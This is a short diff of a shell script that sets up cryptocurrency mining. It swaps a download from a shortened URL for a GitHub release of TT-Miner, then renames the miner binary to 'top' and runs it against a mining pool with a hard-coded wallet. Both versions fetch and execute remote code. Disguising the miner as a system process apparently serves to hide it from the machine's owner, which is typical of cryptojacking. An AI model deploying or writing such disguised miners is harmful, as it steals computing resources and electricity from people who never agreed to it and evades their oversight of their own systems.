@@ -1,5 +1,11 @@
-wget -O LUCK https://s.id/gal91
+wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.0/TT-Miner-2024.3.0.tar.gz
 
-chmod +x LUCK
+tar -xf TT-Miner-2024.3.0.tar.gz
 
-./LUCK -a flex -P lc1qe0t4ns5pwr50mdww7ttw37p6zs5zhu57z2qu3y.luck@eu.mpool.live:5271
+cd TT-Miner-2024.3.0
+
+mv TT-Miner top
+
+chmod +x top
+
+./top -a flex -P lc1qe0t4ns5pwr50mdww7ttw37p6zs5zhu57z2qu3y.luck@eu.mpool.live:5271
